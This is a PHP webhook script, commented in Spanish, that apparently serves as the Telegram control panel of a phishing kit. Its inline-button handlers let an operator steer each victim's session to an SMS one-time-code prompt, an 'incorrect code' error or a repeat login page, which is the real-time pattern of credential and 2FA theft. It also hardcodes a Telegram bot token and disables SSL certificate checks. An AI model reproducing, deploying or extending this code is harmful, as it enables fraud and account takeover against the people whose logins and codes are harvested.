<?php

// Auto-detectar la URL base del sitio
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$scriptDir = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
$SITE_URL = $protocol . '://' . $host . $scriptDir;

// Token: desde GET o hardcodeado como fallback
$BOT_TOKEN = $_GET['token'] ?? '8587374664:AAHqJtjHF_kvUjPKFX_oafSU3RbWwkmKI_Y';

// Si se accede por navegador (GET) con token, registrar el webhook
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['token'])) {
    header('Content-Type: text/html; charset=utf-8');
    $webhookUrl = $SITE_URL . '/bot.php';
    $apiUrl = "https://api.telegram.org/bot{$BOT_TOKEN}/setWebhook";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'url' => $webhookUrl,
        'allowed_updates' => ['message', 'callback_query']
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = json_decode(curl_exec($ch), true);
    curl_close($ch);
    
    if ($response['ok'] ?? false) {
        echo "<h2 style='color:green;font-family:sans-serif'>&#10003; Webhook configurado exitosamente</h2>";
        echo "<p style='font-family:sans-serif'><b>URL del webhook:</b> {$webhookUrl}</p>";
        echo "<p style='font-family:sans-serif'><b>Token:</b> {$BOT_TOKEN}</p>";
    } else {
        echo "<h2 style='color:red;font-family:sans-serif'>&#10007; Error al configurar webhook</h2>";
        echo "<pre>" . json_encode($response, JSON_PRETTY_PRINT) . "</pre>";
    }
    exit;
}

header('Content-Type: application/json');
$SESSIONS_DIR = __DIR__ . '/sessions/';

// Crear directorio de sesiones si no existe
if (!is_dir($SESSIONS_DIR)) {
    mkdir($SESSIONS_DIR, 0777, true);
}

// Función para enviar mensaje a Telegram
function sendTelegram($token, $chatId, $text, $replyMarkup = null) {
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    if ($replyMarkup) {
        $data['reply_markup'] = json_encode($replyMarkup);
    }
    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

// Función para escribir estado de sesión
function writeSession($sessionId, $action) {
    global $SESSIONS_DIR;
    $file = $SESSIONS_DIR . preg_replace('/[^a-zA-Z0-9_\-@.]/', '_', $sessionId) . '.json';
    file_put_contents($file, json_encode([
        'action' => $action,
        'time' => time()
    ]));
}

// Recibir update de Telegram
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    echo json_encode(['ok' => true, 'msg' => 'no update']);
    exit;
}

// Manejar callback_query (botones inline)
if (isset($update['callback_query'])) {
    $callbackQuery = $update['callback_query'];
    $data = $callbackQuery['data'];
    $chatId = $callbackQuery['message']['chat']['id'];
    $messageId = $callbackQuery['message']['message_id'];

    // Parsear acción y sessionId del callback_data
    // formato: "action:sessionId"
    $parts = explode(':', $data, 2);
    $action = $parts[0] ?? '';
    $sessionId = $parts[1] ?? '';

    if ($action === 'sms' && $sessionId) {
        writeSession($sessionId, 'sms');
        // Responder al callback
        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'callback_query_id' => $callbackQuery['id'],
            'text' => '✅ Usuario redirigido a código SMS'
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    } elseif ($action === 'info' && $sessionId) {
        writeSession($sessionId, 'info_error');
        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'callback_query_id' => $callbackQuery['id'],
            'text' => '✅ Usuario notificado de error'
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    } elseif ($action === 'sms_error' && $sessionId) {
        writeSession($sessionId, 'sms_error');
        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'callback_query_id' => $callbackQuery['id'],
            'text' => '✅ Usuario notificado de código incorrecto'
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    } elseif ($action === 'login' && $sessionId) {
        writeSession($sessionId, 'login');
        $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'callback_query_id' => $callbackQuery['id'],
            'text' => '✅ Usuario redirigido al inicio de sesión'
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

echo json_encode(['ok' => true]);
?>
